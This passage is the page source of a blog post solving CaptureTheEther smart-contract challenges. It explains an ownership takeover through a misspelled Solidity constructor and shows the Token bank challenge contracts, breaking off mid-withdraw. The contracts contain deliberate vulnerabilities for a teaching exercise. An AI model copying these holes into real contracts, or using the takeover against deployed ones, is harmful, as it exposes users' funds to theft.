@@ -1,0 +1,574 @@
+
+<!DOCTYPE html>
+<html lang="en" data-figures="" class="page" data-mode="dim">
+  <head>
+<title>Solving CaptureTheEther - Part 5 of 5 - Miscellaneous | tqts.ar</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HFZFM2N29W"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-HFZFM2N29W');
+</script>
+
+<meta property="og:locale" content="en" />
+
+<meta property="og:type" content="article">
+<meta name="description" content="This last category of challenges is a mix of various types of vulnerabilities that don&#39;t really fit into any of the other categories.">
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:creator" content="">
+<meta name="twitter:title" content="Solving CaptureTheEther - Part 5 of 5 - Miscellaneous" />
+<meta property="og:url" content="https://tqts.ar/post/capturetheether-5/" />
+<meta property="og:title" content="Solving CaptureTheEther - Part 5 of 5 - Miscellaneous" />
+<meta property="og:description" content="This last category of challenges is a mix of various types of vulnerabilities that don&#39;t really fit into any of the other categories." />
+<meta property="og:image" content="https://tqts.ar/images/thumbnail.png" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://tqts.ar/icons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tqts.ar/icons/favicon-32x32.png">
+<link rel="manifest" href="https://tqts.ar/icons/site.webmanifest">
+
+<link rel="canonical" href="https://tqts.ar/post/capturetheether-5/">
+
+    
+
+    
+    
+    <link rel="preload" href="https://tqts.ar/css/styles.01869c76e4757810d94ecbdccadba853d9d01d9416dfeb113df02e1479ff8b36e284e8bfeb3e8f353f2fdcdcbbdfcf27e558dbda96eb6341bfc304d55cd9e986.css" integrity = "sha512-AYacduR1eBDZTsvcytuoU9nQHZQW3&#43;sRPfAuFHn/izbihOi/6z6PNT8v3Ny7388n5Vjb2pbrY0G/wwTVXNnphg==" as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" as="script" integrity=
+    "sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://tqts.ar/css/styles.01869c76e4757810d94ecbdccadba853d9d01d9416dfeb113df02e1479ff8b36e284e8bfeb3e8f353f2fdcdcbbdfcf27e558dbda96eb6341bfc304d55cd9e986.css" integrity="sha512-AYacduR1eBDZTsvcytuoU9nQHZQW3&#43;sRPfAuFHn/izbihOi/6z6PNT8v3Ny7388n5Vjb2pbrY0G/wwTVXNnphg==" crossorigin="anonymous">
+    
+  </head>
+  
+  
+  
+    
+  
+  <body data-code="25" data-lines="true" id="documentTop">
+
+<script type="text/javascript" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[','\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+</script>
+<header class="nav_header" >
+  <nav class="nav"><a href='https://tqts.ar/' class="nav_brand nav_item" title="tqts.ar">
+  <img src="https://tqts.ar/logos/logo.png" class="logo" alt="tqts.ar">
+  <div class="nav_close">
+    <div><svg class="icon">
+  <use xlink:href="#open-menu"></use>
+</svg><svg class="icon">
+  <use xlink:href="#closeme"></use>
+</svg></div>
+  </div>
+</a>
+
+    <div class='nav_body nav_body_left'>
+      
+      
+      
+        
+
+  <div class="nav_parent">
+    <a href="https://tqts.ar/" class="nav_item" title="Home">Home </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/posts/" class="nav_item" title="Archives">Archives </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/about/" class="nav_item" title="About">About </a>
+  </div>
+      
+<div class='follow'>
+  <a href="https://github.com/tqtsar">
+    <svg class="icon">
+  <use xlink:href="#github"></use>
+</svg>
+  </a>
+    
+  <a href="https://tqts.ar/index.xml">
+    <svg class="icon">
+  <use xlink:href="#rss"></use>
+</svg>
+  </a>
+<div class="color_mode">
+  <input type="checkbox" class="color_choice" id="mode">
+</div>
+
+</div>
+
+    </div>
+  </nav>
+</header>
+
+    <main>
+  
+<div class="grid-inverse wrap content">
+  <article class="post_content">
+    <h1 class="post_title">Solving CaptureTheEther - Part 5 of 5 - Miscellaneous</h1>
+  <div class="post_meta">
+    <span><svg class="icon">
+  <use xlink:href="#calendar"></use>
+</svg></span>
+    <span class="post_date">
+      Nov 10, 2021</span>
+    <span class="post_time"> · 6 min read</span><span>&nbsp;· <a href='https://tqts.ar/tags/solidity' title="Solidity" class="post_tag button button_translucent">Solidity
+        </a><a href='https://tqts.ar/tags/python' title="Python" class="post_tag button button_translucent">Python
+        </a><a href='https://tqts.ar/tags/remix' title="Remix" class="post_tag button button_translucent">Remix
+        </a>
+    </span>
+    <span class="page_only">&nbsp;·
+  <div class="post_share">
+    Share on:
+    <a href="https://twitter.com/intent/tweet?text=Solving%20CaptureTheEther%20-%20Part%205%20of%205%20-%20Miscellaneous&url=https%3a%2f%2ftqts.ar%2fpost%2fcapturetheether-5%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#twitter"></use>
+</svg>
+    </a>
+    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2ftqts.ar%2fpost%2fcapturetheether-5%2f&t=Solving%20CaptureTheEther%20-%20Part%205%20of%205%20-%20Miscellaneous" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#facebook"></use>
+</svg>
+    </a>
+    <a href="#linkedinshare" id = "linkedinshare" class="linkedin" title="Share on LinkedIn" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#linkedin"></use>
+</svg>
+    </a>
+    <a href="https://tqts.ar/post/capturetheether-5/" title="Copy Link" class="link link_yank">
+      <svg class="icon">
+  <use xlink:href="#copy"></use>
+</svg>
+    </a>
+  </div>
+  </span>
+  </div>
+
+
+
+
+    
+    <div class="post_toc">
+      <h2>Overview</h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#assume-ownership">Assume ownership</a>
+      <ul>
+        <li><a href="#contract-analysis">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#conclusions">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#token-bank">Token bank</a>
+      <ul>
+        <li><a href="#contract-analysis-1">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-1">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#conclusions-1">Conclusions</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="post_body"><p>This last category of challenges is a mix of various types of vulnerabilities that don't really fit into any of the other categories.</p>
+<style type="text/css">.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative}</style>
+<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice info" >
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"></use></svg></span>Info</p><p>All my solutions to CaptureTheEther were coded some time ago, while I was still new at Solidity and EVM. All of them work, however they certainly don't meet any good coding recommendation whatsoever.</p>
+<p>It was part of my learning path, and I don't intend to update them as it serves me (and hopefully you too!) as a remainder that learning is a never-ending process that rewards you when you look back and see your real progress.</p>
+<p>The complete code for these solutions is at my <a href="https://github.com/tqtsar/cte-solutions">CTE-Solutions github repo</a>.</p></div>
+
+<hr>
+<h2 id="assume-ownership">Assume ownership</h2>
+<hr>
+<p>Simple challenge where the solution is to become the owner. Good test for attention to details.</p>
+<h3 id="contract-analysis">Contract analysis</h3>
+<p>In order to set <code>bool isComplete</code> to <code>true</code>, the owner has to call <code>authenticate()</code>. However, the owner is the contract deployer, not the player.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">21</span><span class="p">;</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kd">contract</span> <span class="nc">AssumeOwnershipChallenge</span> <span class="p">{</span>
+<span class="ln"> 4</span>    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+<span class="ln"> 5</span>    <span class="kt">bool</span> <span class="k">public</span> <span class="n">isComplete</span><span class="p">;</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span>    <span class="kd">function</span> <span class="nf">AssumeOwmershipChallenge</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 8</span>        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="ln"> 9</span>    <span class="p">}</span>
+<span class="ln">10</span>
+<span class="ln">11</span>    <span class="kd">function</span> <span class="nf">authenticate</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">12</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+<span class="ln">13</span>
+<span class="ln">14</span>        <span class="n">isComplete</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">15</span>    <span class="p">}</span>
+<span class="ln">16</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector">Vulnerability / Attack vector</h3>
+<p>What seems to be the constructor is not a constructor, because its name is different from the contract.</p>
+<h3 id="solution">Solution</h3>
+<p>The function <code>AssumeOwmershipChallenge()</code> has a typo: the word <code>Owmership</code> should be <code>Ownership</code>. This makes it a public normal function, not a constructor, so anyone can call it and become the owner.</p>
+<p>To solve the level, call <code>AssumeOwmershipChallenge()</code> and then <code>authenticate()</code>.</p>
+<h3 id="conclusions">Conclusions</h3>
+<p>A typo in the constructor name created a huge vulnerability. Modern Solidity versions require the constructor to be defined as <code>constructor()</code> instead, to avoid these risks.</p>
+<p>This used to be an easy mistake to make back in the day, when people changed the contract name and not the constructor.</p>
+<hr>
+<h2 id="token-bank">Token bank</h2>
+<hr>
+<p>This challenge is about a token bank, that is, a contract that allows anyone to deposit tokens and withdraw them later. The challenge mints a total of 1000000 tokens upon deployment, with half of those assigned to the player. The goal is to empty the bank.</p>
+<h3 id="contract-analysis-1">Contract analysis</h3>
+<p>There are two contracts in this level. The first one implements the <a href="https://github.com/ethereum/EIPs/issues/223">ERC-223</a> compliant <em>SimpleERC223Token</em>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">21</span><span class="p">;</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kd">interface</span> <span class="nc">ITokenReceiver</span> <span class="p">{</span>
+<span class="ln"> 4</span>    <span class="kd">function</span> <span class="nf">tokenFallback</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+<span class="ln"> 5</span><span class="p">}</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="kd">contract</span> <span class="nc">SimpleERC223Token</span> <span class="p">{</span>
+<span class="ln"> 8</span>    <span class="c1">// Track how many tokens are owned by each address.
+</span><span class="ln"> 9</span><span class="c1"></span>    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>
+<span class="ln">10</span>
+<span class="ln">11</span>    <span class="kt">string</span> <span class="k">public</span> <span class="nb">name</span> <span class="o">=</span> <span class="s">&#34;Simple ERC223 Token&#34;</span><span class="p">;</span>
+<span class="ln">12</span>    <span class="kt">string</span> <span class="k">public</span> <span class="n">symbol</span> <span class="o">=</span> <span class="s">&#34;SET&#34;</span><span class="p">;</span>
+<span class="ln">13</span>    <span class="kt">uint8</span> <span class="k">public</span> <span class="n">decimals</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
+<span class="ln">14</span>
+<span class="ln">15</span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="o">*</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">**</span> <span class="n">decimals</span><span class="p">);</span>
+<span class="ln">16</span>
+<span class="ln">17</span>    <span class="kd">event</span> <span class="nc">Transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">18</span>
+<span class="ln">19</span>    <span class="kd">function</span> <span class="nf">SimpleERC223Token</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">20</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">;</span>
+<span class="ln">21</span>        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">totalSupply</span><span class="p">);</span>
+<span class="ln">22</span>    <span class="p">}</span>
+<span class="ln">23</span>
+<span class="ln">24</span>    <span class="kd">function</span> <span class="nf">isContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">is_contract</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">25</span>        <span class="kt">uint</span> <span class="n">length</span><span class="p">;</span>
+<span class="ln">26</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln">27</span>            <span class="c1">//retrieve the size of the code on target address, this needs assembly
+</span><span class="ln">28</span><span class="c1"></span>            <span class="n">length</span> <span class="o">:=</span> <span class="nf">extcodesize</span><span class="p">(</span><span class="n">_addr</span><span class="p">)</span>
+<span class="ln">29</span>        <span class="p">}</span>
+<span class="ln">30</span>        <span class="nf">return</span> <span class="n">length</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="err">;</span>
+<span class="ln">31</span>    <span class="p">}</span>
+<span class="ln">32</span>
+<span class="ln">33</span>    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">34</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">empty</span><span class="p">;</span>
+<span class="ln">35</span>        <span class="k">return</span> <span class="nb">transfer</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="nb">value</span><span class="p">,</span> <span class="n">empty</span><span class="p">);</span>
+<span class="ln">36</span>    <span class="p">}</span>
+<span class="ln">37</span>
+<span class="ln">38</span>    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="nb">data</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">39</span>        <span class="nb">require</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">40</span>
+<span class="ln">41</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">42</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">43</span>        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">44</span>
+<span class="ln">45</span>        <span class="k">if</span> <span class="p">(</span><span class="n">isContract</span><span class="p">(</span><span class="n">to</span><span class="p">))</span> <span class="p">{</span>
+<span class="ln">46</span>            <span class="n">ITokenReceiver</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">tokenFallback</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">value</span><span class="p">,</span> <span class="nb">data</span><span class="p">);</span>
+<span class="ln">47</span>        <span class="p">}</span>
+<span class="ln">48</span>        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">49</span>    <span class="p">}</span>
+<span class="ln">50</span>
+<span class="ln">51</span>    <span class="kd">event</span> <span class="nc">Approval</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">52</span>
+<span class="ln">53</span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">public</span> <span class="n">allowance</span><span class="p">;</span>
+<span class="ln">54</span>
+<span class="ln">55</span>    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span>
+<span class="ln">56</span>        <span class="k">public</span>
+<span class="ln">57</span>        <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span>
+<span class="ln">58</span>    <span class="p">{</span>
+<span class="ln">59</span>        <span class="n">allowance</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">spender</span><span class="p">]</span> <span class="o">=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">60</span>        <span class="n">emit</span> <span class="n">Approval</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">61</span>        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">62</span>    <span class="p">}</span>
+<span class="ln">63</span>
+<span class="ln">64</span>    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span>
+<span class="ln">65</span>        <span class="k">public</span>
+<span class="ln">66</span>        <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span>
+<span class="ln">67</span>    <span class="p">{</span>
+<span class="ln">68</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]);</span>
+<span class="ln">69</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="n">allowance</span><span class="p">[</span><span class="k">from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]);</span>
+<span class="ln">70</span>
+<span class="ln">71</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">-=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">72</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">73</span>        <span class="n">allowance</span><span class="p">[</span><span class="k">from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">74</span>        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="nb">value</span><span class="p">);</span>
+<span class="ln">75</span>        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">76</span>    <span class="p">}</span>
+<span class="ln">77</span><span class="p">}</span>
+</code></pre></div><p>The second contract is the challenge itself:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">TokenBankChallenge</span> <span class="p">{</span>
+<span class="ln"> 2</span>    <span class="n">SimpleERC223Token</span> <span class="k">public</span> <span class="n">token</span><span class="p">;</span>
+<span class="ln"> 3</span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span>    <span class="kd">function</span> <span class="nf">TokenBankChallenge</span><span class="p">(</span><span class="kt">address</span> <span class="n">player</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 6</span>        <span class="n">token</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SimpleERC223Token</span><span class="p">();</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>        <span class="c1">// Divide up the 1,000,000 tokens, which are all initially assigned to
+</span><span class="ln"> 9</span><span class="c1"></span>        <span class="c1">// the token contract&#39;s creator (this contract).
+</span><span class="ln">10</span><span class="c1"></span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500000</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="mi">18</span><span class="p">;</span>  <span class="c1">// half for me
+</span><span class="ln">11</span><span class="c1"></span>        <span class="n">balanceOf</span><span class="p">[</span><span class="n">player</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500000</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="mi">18</span><span class="p">;</span>      <span class="c1">// half for you
+</span><span class="ln">12</span><span class="c1"></span>    <span class="p">}</span>
+<span class="ln">13</span>
+<span class="ln">14</span>    <span class="kd">function</span> <span class="nf">isComplete</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">15</span>        <span class="k">return</span> <span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+<span class="ln">16</span>    <span class="p">}</span>
+<span class="ln">17</span>
+<span class="ln">18</span>    <span class="kd">function</span> <span class="nf">tokenFallback</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">19</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">));</span>
+<span class="ln">20</span>        <span class="nb">require</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">+</span> <span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]);</span>
+<span class="ln">21</span>
+<span class="ln">22</span>        <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">value</span><span class="p">;</span>
+<span class="ln">23</span>    <span class="p">}</span>
+<span class="ln">24</span>
+<span class="ln">25</span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">26</span>        <span class="nb">require</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">27</span>
+<span class="ln">28</span>        <span class="nb">require</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
